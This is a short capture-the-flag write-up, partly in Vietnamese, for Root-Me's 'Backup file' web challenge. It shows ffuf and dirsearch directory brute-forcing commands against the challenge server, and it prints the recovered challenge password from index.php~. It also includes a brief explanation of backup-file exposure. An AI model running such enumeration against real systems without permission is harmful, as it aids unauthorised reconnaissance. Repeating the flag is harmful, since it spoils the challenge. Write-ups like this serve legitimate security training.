# [Backup file](https://www.root-me.org/en/Challenges/Web-Server/Backup-file)

## Solutions

- Sử dụng ffuf để Directory Bruteforcing:
  - `ffuf -w /path/to/wordlists -u http://challenge01.root-me.org/web-serveur/ch11/FUZZ`
- Hoặc sử dụng dirsearch:
  - `python dirsearch.py -u http://challenge01.root-me.org/web-serveur/ch11/`

Kết quả:

- `/web-serveur/ch11/index.php~`: status code 200
- Password trong file `index.php~`: `OCCY9AcNm1tj`

## New Knowledge

Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.

## References

- <https://portswigger.net/kb/issues/006000d8_backup-file>
- <https://github.com/ffuf/ffuf>
- <https://github.com/maurosoria/dirsearch>
- metasploit
